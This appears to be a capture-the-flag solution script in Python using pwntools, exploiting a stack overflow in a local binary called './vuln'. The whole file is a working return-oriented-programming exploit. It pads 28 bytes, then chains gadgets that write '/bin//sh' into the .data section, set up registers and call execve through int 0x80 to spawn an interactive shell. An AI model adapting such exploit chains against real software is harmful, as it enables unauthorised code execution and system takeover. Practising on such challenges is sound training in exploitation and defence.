#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Can you ROP your way out of this one?\n")
payload = (
    "A" * 28 +
    p32(0x0806ee6b) + # pop edx ; ret
    '/bin' +
    p32(0x08064784) + # mov eax, edx ; ret
    p32(0x0806ee6b) + # pop edx ; ret
    p32(0x080da060) + # @ .data
    p32(0x08056e65) + # mov dword ptr [edx], eax ; ret
    p32(0x0806ee6b) + # pop edx ; ret
    '//sh' +
    p32(0x08064784) + # mov eax, edx ; ret
    p32(0x0806ee6b) + # pop edx ; ret
    p32(0x080da064) + # @ .data + 4
    p32(0x08056e65) + # mov dword ptr [edx], eax ; ret
    p32(0x0806ee6b) + # pop edx ; ret
    p32(0x080da068) + # @ .data + 8
    p32(0x08056420) + # xor eax, eax ; ret
    p32(0x08056e65) + # mov dword ptr [edx], eax ; ret
    p32(0x080481c9) + # pop ebx ; ret
    p32(0x080da060) + # @ .data
    p32(0x0806ee92) + # pop ecx ; pop ebx ; ret
    p32(0x080da068) + # @ .data + 8
    p32(0x080da060) + # padding without overwrite ebx
    p32(0x0806ee6b) + # pop edx ; ret
    p32(0x080da068) + # @ .data + 8
    p32(0x08056420) + # xor eax, eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x0807c2fa) + # inc eax ; ret
    p32(0x08049563)  # int 0x80
)

r.sendline(payload)
r.interactive()
r.close()
